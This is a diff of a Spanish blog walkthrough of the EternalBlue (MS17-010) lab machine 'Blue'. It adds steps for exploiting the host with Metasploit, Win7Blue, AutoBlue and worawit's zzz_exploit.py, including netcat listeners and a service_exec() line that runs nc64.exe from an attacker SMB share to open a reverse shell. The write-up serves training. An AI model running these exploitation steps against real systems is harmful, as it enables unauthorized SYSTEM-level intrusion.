@@ -93,14 +93,14 @@
 
 <p>El objetivo de este artículo es reforzar lo aprendido hasta ahora, pero también ofrecer una guía más completa, explorando distintos enfoques y metodologías que podrían ser útiles para quienes buscan profundizar más en el proceso.</p>
 
-<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>
+<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase de Reconocimiento</h3>
 
 <p>Primeramente vamos a lanzar una <em>traza ICMP</em> para saber si la máquina está activa.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 &lt;IP del host&gt;
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/2.png" alt="2" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="http://192.168.92.128:80/2.png" alt="2" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del <em>TTL</em>; en este caso el valor del <em>TTL</em> de la máquina es <code class="language-plaintext highlighter-rouge">128</code>, por lo que podemos intuir que estamos ante una máquina <em>Windows</em>. Recordemos que algunos de los valores referenciales son los siguientes:</p>
 
@@ -231,7 +231,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/3.png" alt="3" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Rápidamente podemos determinar que estamos frente a un <em>Windows 7 Ultimate 7601 Service Pack 1</em> de <em>64 bits</em>. Además, podemos observar que el firmado del <em>SMB</em> <strong>no</strong> es requerido en este host. En un entorno de <code class="language-plaintext highlighter-rouge">Active Directory</code>, esta configuración podría dar lugar a ataques como <code class="language-plaintext highlighter-rouge">NTLM Relay</code>; sin embargo, en este escenario particular no representa un vector de ataque relevante.</p>
+<p>Rápidamente podemos determinar que estamos frente a un <em>Windows 7 Ultimate 7601 Service Pack 1</em> de <em>64 bits</em>. Además, podemos observar que el firmado del <em>SMB</em> no es requerido en este host. En un entorno de <code class="language-plaintext highlighter-rouge">Active Directory</code>, esta configuración podría dar lugar a ataques como <code class="language-plaintext highlighter-rouge">NTLM Relay</code>; sin embargo, en este escenario particular no representa un vector de ataque relevante.</p>
 
 <p>En cuanto a los dialectos soportados, podemos ver que <code class="language-plaintext highlighter-rouge">SMBv1</code> se encuentra habilitado, por lo que el host podría ser vulnerable a <code class="language-plaintext highlighter-rouge">EternalBlue</code>, siempre que el sistema no haya sido debidamente parcheado.</p>
 
@@ -244,13 +244,13 @@
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> smb-protocols,smb2-security-mode,smb-security-mode,smb-os-discovery <span class="nt">-p</span> 139,445 &lt;IP del host&gt;
 </code></pre></div></div>
 
-<p>Similar a los resultados obtenidos con <em>NetExec</em>, este escaneo con <code class="language-plaintext highlighter-rouge">Nmap</code> nos proporciona información sobre los protocolos soportados, la configuración de seguridad de <em>SMB</em>, y la versión del sistema operativo.</p>
-
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/4.png" alt="4" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Los resultados son consistentes con los obtenidos previamente con <em>NetExec</em>, permitiéndonos validar los hallazgos mediante una segunda herramienta.</p>
 
 <h5 id="metasploit"><a href="#header-5"></a>Metasploit</h5>
 
-<p>Finalmente, como alternativa, podemos usar <code class="language-plaintext highlighter-rouge">Metasploit</code> para realizar la enumeración del servicio <code class="language-plaintext highlighter-rouge">SMB</code>. El módulo auxiliar <code class="language-plaintext highlighter-rouge">smb_version</code> nos permitirá listar los dialectos soportados y el estado del firmado <em>SMB</em>:</p>
+<p>Finalmente, como alternativa, podemos usar <code class="language-plaintext highlighter-rouge">Metasploit</code> para enumerar el servicio <code class="language-plaintext highlighter-rouge">SMB</code> mediante el módulo auxiliar <code class="language-plaintext highlighter-rouge">smb_version</code>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
 use auxiliary/scanner/smb/smb_version
@@ -260,35 +260,35 @@ run
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/5.png" alt="5" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Una vez ejecutado, podemos confirmar nuevamente los dialectos soportados por el servidor, el dialecto preferido, la configuración del firmado <em>SMB</em>, y la versión del sistema operativo.</p>
+<p>Una vez ejecutado, podemos corroborar los hallazgos previamente identificados, reforzando la consistencia del análisis.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/6.png" alt="6" class="blog-image" onclick="expandImage(this)" /></p>
 
 <h4 id="smb-shares"><a href="#header-4"></a>SMB Shares</h4>
 
-<p>Con todo esta información en mente, podemos profundizar aún más en el servicio <code class="language-plaintext highlighter-rouge">SMB</code>. Dado que las <em>null sessions</em> están habilitadas, podemos establecer una sesión anónima contra el servidor e intentar enumerar recursos compartidos a nivel de red; y en caso de que los permisos lo permitan, también podríamos interactuar con dichos recursos. Para esta tarea utilizaremos <code class="language-plaintext highlighter-rouge">SMBMap</code>:</p>
+<p>Con toda esta información en mente, podemos profundizar aún más en el servicio <code class="language-plaintext highlighter-rouge">SMB</code>. Dado que las <em>null sessions</em> están habilitadas, podemos establecer una sesión anónima contra el servidor e intentar enumerar recursos compartidos a nivel de red y, en caso de que los permisos lo permitan, interactuar con ellos. Para esta tarea utilizaremos <code class="language-plaintext highlighter-rouge">SMBMap</code>:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> &lt;IP del host&gt;
 </code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/7.png" alt="7" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>En este caso, únicamente podemos listar los recursos existentes, pues no contamos con permisos suficientes para interactuar con ellos, ya que el acceso está restringido.</p>
+<p>En este caso, únicamente podemos listar los recursos existentes, ya que no contamos con permisos suficientes para interactuar con ellos.</p>
 
 <h4 id="eternalblue"><a href="#header-4"></a>EternalBlue</h4>
 
-<p>Esto nos deja con un último vector potencial a evaluar: determinar si la implementación de <code class="language-plaintext highlighter-rouge">SMBv1</code> presente en el sistema se encuentra sin parchear y, por lo tanto, es vulnerable a <code class="language-plaintext highlighter-rouge">MS17-010</code>, o <code class="language-plaintext highlighter-rouge">EternalBlue</code>. Para verificar la presencia de esta vulnerabilidad, utilizaremos dos enfoques distintos.</p>
+<p>Esto nos deja con un último vector potencial a evaluar: determinar si la implementación de <code class="language-plaintext highlighter-rouge">SMBv1</code> presente en el sistema se encuentra sin parchear y, por lo tanto, es vulnerable a <code class="language-plaintext highlighter-rouge">MS17-010</code> (<code class="language-plaintext highlighter-rouge">EternalBlue</code>). Para verificar la presencia de esta vulnerabilidad, utilizaremos dos herramientas distintas.</p>
 
 <h5 id="nmap-1"><a href="#header-5"></a>Nmap</h5>
 
-<p>Podemos continuar utilizando scripts de descubrimiento de <code class="language-plaintext highlighter-rouge">Nmap</code>, esta vez orientados a la detección de vulnerabilidades. En este caso, emplearemos el script <code class="language-plaintext highlighter-rouge">smb-vuln-ms17-010</code>, para comprobar si el host es susceptible a esta vulnerabilidad:</p>
+<p>Podemos continuar utilizando scripts de descubrimiento de <code class="language-plaintext highlighter-rouge">Nmap</code>, esta vez orientados a la detección de vulnerabilidades. En este caso, emplearemos el script <code class="language-plaintext highlighter-rouge">smb-vuln-ms17-010</code> para comprobar si el host es susceptible a esta vulnerabilidad:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> smb-vuln-ms17-010 <span class="nt">-p</span> 445 &lt;IP del host&gt;
 </code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/8.png" alt="8" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>El resultado del escaneo confirma que el host es vulnerable a <code class="language-plaintext highlighter-rouge">MS17-010</code>, por lo que podemos explotar esta vulnerabilidad.</p>
+<p>El resultado del escaneo indica que el host es vulnerable a <code class="language-plaintext highlighter-rouge">MS17-010</code>, lo que sugiere que la explotación podría ser viable.</p>
 
 <h5 id="metasploit-1"><a href="#header-5"></a>Metasploit</h5>
 
@@ -310,13 +310,167 @@ run
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/9.png" alt="9" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Al igual que con <em>Nmap</em>, confirmamos que el host es vulnerable a <code class="language-plaintext highlighter-rouge">MS17-010</code>, por lo que a explotación resulta viable.</p>
+<p>Al igual que con <em>Nmap</em>, confirmamos que el host es vulnerable a <code class="language-plaintext highlighter-rouge">MS17-010</code>, lo que refuerza la viabilidad de la explotación.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/10.png" alt="10" class="blog-image" onclick="expandImage(this)" /></p>
 
-<h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>
+<h3 id="fase-de-explotación"><a href="#header-3"></a>Fase de Explotación</h3>
 
-<p>Con este mismo módulo, más adelante en caso de que quisiéramos usar herramientas automatizadas, podríamos realizar la explotación. Sin embargo, como siempre, yo discourage usar herramientas automatizadas ya que perdemos bastante el control sobre lo que está pasando por detrás, de modo que no aprendemos; sin embargo, más adelante cubriré ambas metodologías y me enfocaré mucho más en la vía manual</p>
+<p>Una vez confirmamos que el sistema es vulnerable a <code class="language-plaintext highlighter-rouge">MS17-010</code> (<code class="language-plaintext highlighter-rouge">EternalBlue</code>), el siguiente paso consiste en intentar su explotación con el objetivo de obtener <em>ejecución remota de código</em> (RCE) en la máquina víctima.</p>
+
+<p>Antes de continuar, me gustaría comentar brevemente la metodología que seguiremos. Las herramientas automatizadas simplifican considerablemente el proceso de explotación y permiten obtener resultados de forma rápida. Sin embargo, comprender cómo y por qué funciona la vulnerabilidad nos da un mayor control sobre el proceso y nos ayuda a entender qué está ocurriendo en cada etapa.</p>
+
+<p>Por este motivo, abordaremos ambos enfoques: por un lado, la explotación automatizada y, por otro, la explotación manual. No obstante, pondremos especial énfasis en esta última, ya que nos permite profundizar en el funcionamiento interno del fallo y desarrollar una base técnica más sólida. Este enfoque resulta especialmente útil en contextos formativos y certificaciones como la <em>Offensive Security Certified Professional</em>, donde el uso de herramientas automatizadas se encuentra restringido.</p>
+
+<h4 id="explotación-automatizada"><a href="#header-4"></a>Explotación Automatizada</h4>
+
+<p>Para realizar la explotación automatizada utilizaremos <code class="language-plaintext highlighter-rouge">Metasploit</code>. En concreto, emplearemos el mismo módulo que utilizamos previamente para comprobar si el host era susceptible a <code class="language-plaintext highlighter-rouge">MS17‑010</code> (<code class="language-plaintext highlighter-rouge">EternalBlue</code>).</p>
+
+<p>La diferencia es que, en esta ocasión, en lugar de ejecutar la función <em>check</em>, lanzaremos directamente el exploit con el objetivo de obtener <em>ejecución remota de código</em> (RCE) sobre la máquina víctima.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST &lt;IP del host&gt;
+exploit
+</code></pre></div></div>
+
+<p><img src="http://192.168.92.128:80/11.png" alt="11" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>La ejecución del módulo nos devuelve una sesión <code class="language-plaintext highlighter-rouge">Meterpreter</code> desde la cual podemos interactuar con el sistema comprometido. Desde esta sesión es posible invocar una shell interactiva.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+</code></pre></div></div>
+
+<p><img src="http://192.168.92.128:80/12.png" alt="12" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Al verificar el contexto de ejecución, observamos que el proceso se ejecuta como <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>, es decir, con los máximos privilegios del sistema. Por tanto, no es necesario realizar ninguna escalada de privilegios adicional.</p>
+
+<p>De esta forma, habremos explotado satisfactoriamente la vulnerabilidad y obtenido control completo sobre la máquina víctima.</p>
+
+<h4 id="explotación-manual"><a href="#header-4"></a>Explotación Manual</h4>
+
+<p>A diferencia del enfoque anterior, en esta ocasión asumiremos progresivamente un mayor grado de control sobre el proceso de explotación, trabajando directamente con distintas implementaciones de <code class="language-plaintext highlighter-rouge">MS17-010</code>.</p>
+
+<h5 id="win7blue"><a href="#header-5"></a>Win7Blue</h5>
+
+<p>La primera implementación con la que trabajaremos será <code class="language-plaintext highlighter-rouge">Win7Blue</code>, desarrollada por el usuario <a href="https://github.com/d4t4s3c">d4t4s3c</a>. Dado que previamente realizamos una enumeración exhaustiva del servicio <code class="language-plaintext highlighter-rouge">SMB</code> y determinamos la versión exacta del sistema operativo, sabemos que esta implementación, diseñada específicamente para <em>Windows 7</em>, se ajusta a la versión que identificamos.</p>
+
+<p>Comenzaremos clonando el repositorio:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/d4t4s3c/Win7Blue
+</code></pre></div></div>
+
+<p>Una vez clonado el proyecto, nos situamos dentro del directorio y ejecutamos el script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash Win7Blue
+</code></pre></div></div>
+
+<p>Desde el menú interactivo indicaremos la arquitectura del sistema (en nuestro caso, <code class="language-plaintext highlighter-rouge">64 bits</code>, algo que ya habíamos identificado durante la fase de enumeración), la dirección IP de la máquina víctima, nuestra dirección IP y el puerto en el que nos pondremos en escucha.</p>
+
+<p>El propio script se encarga de generar el <code class="language-plaintext highlighter-rouge">shellcode</code> utilizando <code class="language-plaintext highlighter-rouge">MSFvenom</code>. Antes de lanzar la explotación, pausará la ejecución para que confirmemos que estamos en escucha con <code class="language-plaintext highlighter-rouge">Netcat</code>, proporcionándonos incluso el comando necesario, que ejecutaremos en una nueva terminal:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 443
+</code></pre></div></div>
+
+<p>Una vez confirmada la escucha y continuada la ejecución, el exploit se ejecutará y obtendremos una shell interactiva dentro de la máquina víctima.</p>
+
+<p><img src="http://192.168.92.128:80/13.png" alt="13" class="blog-image" onclick="expandImage(this)" /></p>
+
+<h5 id="autoblue"><a href="#header-5"></a>AutoBlue</h5>
+
+<p>La segunda implementación con la que trabajaremos será <code class="language-plaintext highlighter-rouge">AutoBlue</code>, desarrollada por el usuario <a href="https://github.com/3ndG4me/">3ndG4me</a>. A diferencia de la implementación anterior, en este caso primero generaremos el <code class="language-plaintext highlighter-rouge">shellcode</code> y posteriormente ejecutaremos el exploit.</p>
+
+<p>Comenzaremos clonando el repositorio:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+</code></pre></div></div>
+
+<p>Una vez clonado el proyecto, nos situamos dentro del directorio y accedemos a la carpeta <em>shellcode</em>, donde ejecutaremos el script <code class="language-plaintext highlighter-rouge">shell_prep.sh</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./shell_prep.sh
+</code></pre></div></div>
+
+<p>Desde el menú interactivo seleccionaremos la opción para generar el <code class="language-plaintext highlighter-rouge">shellcode</code> con <code class="language-plaintext highlighter-rouge">MSFvenom</code>. Indicaremos nuestra dirección IP y, dado que el script no detecta automáticamente la arquitectura del sistema objetivo, nos solicitará el puerto en el que nos pondremos en escucha tanto para <em>64 bits</em> como para 32 bits. Asimismo, seleccionaremos la opción para generar una shell interactiva en lugar de una sesión <em>Meterpreter</em> y especificaremos que el payload sea de tipo <em>stageless</em>.</p>
+
+<p><img src="http://192.168.92.128:80/14.png" alt="14" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Una vez generado el <em>shellcode</em>, regresamos al directorio principal. Antes de ejecutar el exploit, debemos ponernos en escucha en el puerto previamente configurado, desde una nueva terminal:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 443
+</code></pre></div></div>
+
+<p>Con el <em>listener</em> activo, ejecutamos <code class="language-plaintext highlighter-rouge">eternalblue_exploit7.py</code>. Dado que previamente realizamos una enumeración exhaustiva, sabemos que esta implementación se ajusta a la versión que identificamos.</p>
+
+<p>Utilizaremos únicamente el <code class="language-plaintext highlighter-rouge">shellcode</code> de <em>64 bits</em>, ya que corresponde a la arquitectura que identificamos; de lo contrario, el uso de una arquitectura incompatible puede provocar fallos inesperados como reinicios o pantallazos azules (BSOD).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python eternalblue_exploit7.py &lt;IP del host&gt; shellcode/sc_x64.bin
+</code></pre></div></div>
+
+<p><img src="http://192.168.92.128:80/15.png" alt="15" class="blog-image" onclick="expandImage(this)" /></p>
+
+<h5 id="ms17-010"><a href="#header-5"></a>MS17-010</h5>
+
+<p>La última implementación con la que trabajaremos será la disponible en el repositorio <code class="language-plaintext highlighter-rouge">MS17-010</code>, desarrollada por el usuario <a href="https://github.com/worawit">worawit</a>. Dentro del repositorio se encuentra el script <em>eternalblue_exploit7.py</em>, que es el que utilizan de forma subyacente las dos implementaciones anteriores. Aunque podríamos utilizarlo junto con un <em>shellcode</em> personalizado, en esta ocasión no será el script que utilizaremos.</p>
+
+<p>El script que emplearemos será <code class="language-plaintext highlighter-rouge">zzz_exploit.py</code>, que ofrece un enfoque más flexible y manual del proceso de explotación.</p>
+
+<p>A diferencia de las implementaciones anteriores, este script no está configurado para enviar automáticamente una <em>reverse shell</em> ni para ejecutar un payload predefinido. En su lugar, nos proporciona un mayor control sobre la sesión <em>SMB</em> establecida, permitiéndonos modificar el comportamiento del exploit según nuestras necesidades. El código incluye secciones comentadas que pueden adaptarse para ejecutar comandos o payloads personalizados mediante la función <code class="language-plaintext highlighter-rouge">service_exec()</code>.</p>
+
+<p>Comenzaremos clonando el repositorio:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/worawit/MS17-010
+</code></pre></div></div>
+
+<p>Una vez clonado el proyecto, nos situamos dentro del directorio. En primer lugar, ejecutaremos el script <code class="language-plaintext highlighter-rouge">checker.py</code> para identificar los <code class="language-plaintext highlighter-rouge">named pipes</code> disponibles en la máquina víctima:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 checker.py
+</code></pre></div></div>
+
+<p><img src="http://192.168.92.128:80/16.png" alt="16" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Aunque las <em>null sessions</em> están habilitadas, será necesario editar el script para especificar un usuario válido, por ejemplo <code class="language-plaintext highlighter-rouge">guest</code>. No será necesario indicar contraseña. Una vez realizado este ajuste, ejecutaremos nuevamente el script y se nos mostrarán los <code class="language-plaintext highlighter-rouge">named pipes</code> disponibles que podremos utilizar durante la explotación.</p>
+
+<p><img src="http://192.168.92.128:80/17.png" alt="17" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p><img src="http://192.168.92.128:80/18.png" alt="18" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Por defecto, el script <code class="language-plaintext highlighter-rouge">zzz_exploit.py</code> crea un archivo pwned.txt en la máquina víctima, lo cual no nos resulta especialmente útil. Lo que haremos ahora será modificar este script, concretamente la función <code class="language-plaintext highlighter-rouge">smb_pwn()</code>.</p>
+
+<p>En primer lugar, especificaremos un usuario válido, de forma similar a como hicimos previamente con <code class="language-plaintext highlighter-rouge">checker.py</code>.</p>
+
+<p><img src="http://192.168.92.128:80/19.png" alt="19" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>A continuación, comentaremos las líneas relacionadas con la creación del archivo y habilitaremos la llamada a <code class="language-plaintext highlighter-rouge">service_exec()</code>, adaptándola a nuestras necesidades.</p>
+
+<p>A diferencia de las implementaciones anteriores, en esta ocasión no generaremos ningún <em>shellcode</em>. En su lugar, levantaremos un recurso compartido en nuestra máquina atacante utilizando el script <code class="language-plaintext highlighter-rouge">smbserver</code> de la suite <code class="language-plaintext highlighter-rouge">Impacket</code>. A través de este recurso compartido expondremos el binario de <code class="language-plaintext highlighter-rouge">Netcat</code> de <code class="language-plaintext highlighter-rouge">64 bits</code>, de modo que la máquina víctima pueda ejecutarlo directamente desde nuestro recurso compartido y establecer una <code class="language-plaintext highlighter-rouge">reverse shell</code> hacia nuestro sistema.</p>
+
+<p>Para conseguir esto, la llamada a <code class="language-plaintext highlighter-rouge">service_exec()</code> quedará de la siguiente forma:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">service_exec</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="sa">r</span><span class="sh">'</span><span class="s">cmd /c \\&lt;IP local&gt;\smbFolder\nc64.exe -e cmd &lt;IP local&gt; 443</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="http://192.168.92.128:80/20.png" alt="20" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Una vez modificado el script, el siguiente paso será descargar el binario de <a href="https://eternallybored.org/misc/netcat/">Netcat</a> que vamos a compartir.</p>
+
+<p>Con el binario ubicado en nuestro directorio de trabajo, desde una nueva terminal crearemos el recurso compartido mediante <code class="language-plaintext highlighter-rouge">smbserver</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-smbserver smbFolder <span class="nb">.</span> <span class="nt">-smb2support</span>
+</code></pre></div></div>
+
+<p>Finalmente, desde otra terminal nos pondremos en escucha con <code class="language-plaintext highlighter-rouge">Netcat</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 443
+</code></pre></div></div>
+
+<p>Con el recurso compartido activo y el listener en ejecución, lanzaremos el exploit indicando uno de los <code class="language-plaintext highlighter-rouge">named pipes</code> identificados anteriormente al ejecutar <code class="language-plaintext highlighter-rouge">checker.py</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 zzz_exploit.py &lt;IP del host&gt; samr
+</code></pre></div></div>
+
+<p>De esta forma, obtendremos una shell interactiva dentro de la máquina víctima con privilegios máximos, ejecutándose como <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</p>
+
+<p><img src="http://192.168.92.128:80/21.png" alt="21" class="blog-image" onclick="expandImage(this)" /></p>
 
   </article>
 
@@ -343,12 +497,15 @@ run
 <div class="image-overlay" onclick="closeImage()"></div>
 <img id="expandedImage" class="expanded-image">
 
+<div class="toc-overlay" id="toc-overlay"></div>
+
 <script>
   document.addEventListener('DOMContentLoaded', function() {
     var toc = document.getElementById('toc');
     var tocList = document.getElementById('toc-list');
     var tocToggle = document.getElementById('toc-toggle');
     var tocClose = document.getElementById('toc-close');
+    var overlay = document.getElementById('toc-overlay');
     var headers = document.querySelectorAll('article h3, article h4, article h5');
     var counters = {
       h3: 0,
@@ -411,11 +568,17 @@ run
       tocToggle.addEventListener('click', function() {
         var isOpen = toc.classList.toggle('is-open');
         tocToggle.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
+
+        if (window.matchMedia('(max-width: 900px)').matches) {
+          overlay.classList.toggle('is-visible', isOpen);
+        }
       });
 
       tocClose.addEventListener('click', function() {
         toc.classList.remove('is-open');
         tocToggle.setAttribute('aria-expanded', 'false');
+
+        overlay.classList.remove('is-visible');
       });
 
       tocList.addEventListener('click', function(event) {
@@ -423,6 +586,12 @@ run
           toc.classList.remove('is-open');
           tocToggle.setAttribute('aria-expanded', 'false');
         }
+      });
+
+      overlay.addEventListener('click', function() {
+        toc.classList.remove('is-open');
+        tocToggle.setAttribute('aria-expanded', 'false');
+        overlay.classList.remove('is-visible');
       });
     } else {
       toc.hidden = true;
